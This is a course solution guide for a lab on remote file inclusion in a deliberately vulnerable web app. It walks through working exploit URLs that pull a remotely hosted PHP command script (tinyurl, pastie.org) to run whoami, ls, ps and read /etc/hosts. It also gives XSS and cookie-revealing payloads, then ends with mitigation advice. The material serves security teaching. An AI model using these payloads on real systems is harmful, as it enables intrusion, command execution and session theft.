## Solution Guide: Remote File Inclusion Activity 

In this activity, you were tasked with first referencing a non-malicious URL to determine how it modifies the webpage. You were then tasked with referencing a remote malicious script contained within a webpage. You then modified the URL to run command-line commands with this malicious script. As a bonus, you were challenged with trying to combine RFI and XSS with a single exploit.

---

1. Test the intended use of the web application.

    - Select `File1.php`, and note the following:

      - The URL changes to the following: <http://192.168.13.25/vulnerabilities/fi/?page=file1.php>.

      - The content on the webpage is displayed as follows:
      
              Hello admin
              Your IP address is: 192.168.13.1
          
    - Select the other links (`File2.php` and `File3.php`) and note their URL and webpage changes.

2. Test an unintended function of the application by referencing a remote webpage.

    - Note that you just tested how the application is designed to access a file on the Replicants web server.

    - Let's test what will happen if the URL is modified to reference an external or remote webpage.
    
    - Change the parameter of the URL to reference an external URL (<http://www.example.com>) instead of one of the files (`File1.php`). For example:
    
      - <http://192.168.13.25/vulnerabilities/fi/?page=http://www.example.com>
      
    - Note how the example.com webpage has been added to the top of the Replicants website.

      - Test other webpages by replacing example.com with other URLs.
        
    - Note that this illustrates that the webpage is designed to allow external references.

    - Let's try something a little more malicious by referencing a remote script instead of a webpage!
    
3. Test remote file inclusion.

    - We just saw how this webpage allows refrencing external sources such as webpages. 

      - Let's see what will happen if we reference a malicious external script instead of a webpage.
      
    - Using your browser in Vagrant, view the following webpage:

      - <https://tinyurl.com/y498epmz>
      
    - Note how this looks exactly like the script that was used in the local file inclusion activity.

      - But this script is hosted remotely!
      
    - Change the URL to reference this webpage, instead of example.com: <http://192.168.13.25/vulnerabilities/fi/?page=https://tinyurl.com/y498epmz>.

    - Note that this will not do anything; similar to the remote inclusion activity, we have to provide the script with a command-line command!

    - Let's start with the `whoami` command.

      - To add this command into the URL, add `cmd=whoami&` between `?` and `page`, as follows:
      
        - `http://192.168.13.25/vulnerabilities/fi/?cmd=whoami&page=https://tinyurl.com/y498epmz`
      
    - Run the command and note the results on the top left of the page.

    - Now see if you can modify the command to run the following:

      - `ls`
    
      - `ps`
    
      - cat the `/etc/hosts` file

    - **Solution**: Here are the commands to run:

        - `ls`:  `http://192.168.13.25/vulnerabilities/fi/?cmd=ls&page=https://tinyurl.com/y498epmz`

        - `ps`: `http://192.168.13.25/vulnerabilities/fi/?cmd=ps&page=https://tinyurl.com/y498epmz`

        - `cat the /etc/hosts file`: `http://192.168.13.25/vulnerabilities/fi/?cmd=cat%20../../../../../etc/hosts&page=https://tinyurl.com/y498epmz`
        
4. **Bonus**: Combine remote file inclusion and cross-site scripting.

    - So far you have been able to run **remote file inclusion** by running remote scripts against a vulnerable web server.

    - These scripts have referenced an external webpage that contained a malicious script.

    - Let's see what would happen if you referenced a script that contained a **cross-site scripting** payload.

    - Using your browser again, look at the following webpage: 

      - <https://tinyurl.com/yxk853vy>

      - Note how this page contains a script that contains XSS payloads we developed previously.

        - `<script>alert("Hey you have been hacked")</script>`

    - Note that the exception is that the XSS payload is embedded within a PHP script.

    - Change the URL to reference this webpage, to see if you can get the XSS payload to execute the popup!

    - **Solution**: The URL to get the XSS payload to execute:

      - `http://192.168.13.25/vulnerabilities/fi/?page=https://tinyurl.com/yxk853vy`

5. **Super Bonus**: Develop your own malicious script to capture cookies with a remote file inclusion exploit.

    - So far you have referenced pre-built webpages that contained malicious PHP script.

    - Let's see if you can write your own malicious PHP script webpage.

      - When your webpage is referenced, a script should run and pop up with the user's session cookies.

    - **Hint**: Look at the format of the script from Step 4, and modify this script to pop up with the session cookies: 

        `<script>alert("Hey you have been hacked")</script>`

    - **Hint**: To build a webpage with the script, do the following:

        - Add your script on the following webpage: <http://pastie.org/>.
      
        - Select Save Paste and then Raw on the top right to display the raw code.
      
        - This will create a unique URL with your code.
          
   - Reference the URL of this raw code from the same vulnerable webpage.

      - Run your URL and see if you can successfully get the session cookies to appear on a pop-up!

    - **Solution**

      - The script to pop up the session cookie will look like the following:

              <?php 
              $html = <<<EOT

              <script>alert(document.cookie)</script>

                EOT;

                echo $html;
                ?> 
                
      - Save the script in <pastie.org>, then select Save Paste > Raw.

        - A new URL will be created. For example:

          - `http://pastie.org/p/6MA1u2AP1qzKzDaxXi8Zwv/raw`

          - Note that your URL will be different.
          
      - Reference the example URL with the following URL:

        - `http://192.168.13.25/vulnerabilities/fi/?page=http://pastie.org/p/6MA1u2AP1qzKzDaxXi8Zwv/raw`
        
      - A pop-up will display your session cookies! 

6. Answer the following mitigation strategy questions:

    - Describe to your management how a malicious user might take advantage of the vulnerabilities that you just exploited. Be sure to include the potential impact.

      - There are many acceptable answers; if a web application is vulnerable to remote file injection, a variety of malicious payloads can be exploited. Impacts can include the following:

          - Display of confidential data, such as user accounts, password hashes, service accounts, network information, or system processes.
        
          - Deletion or modification of the preceding confidential data, which can lead to reputation issues and system outages.

    - Describe in plain language to your manager how you can mitigate the vulnerabilities you just exploited.

      - There are many acceptable answers, all involving input validation. Options can include the following:
      
          - Limit access to remote files in your web application.
      
          - If the file has to be remote, use server-side validation to only allow certain files to be accessed.
      
          - When developing an application, DO NOT use arbitrary input data in a literal file inclusion request.
      
            - Use an allow list of acceptable files and file types.

---

© 2021 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved. 
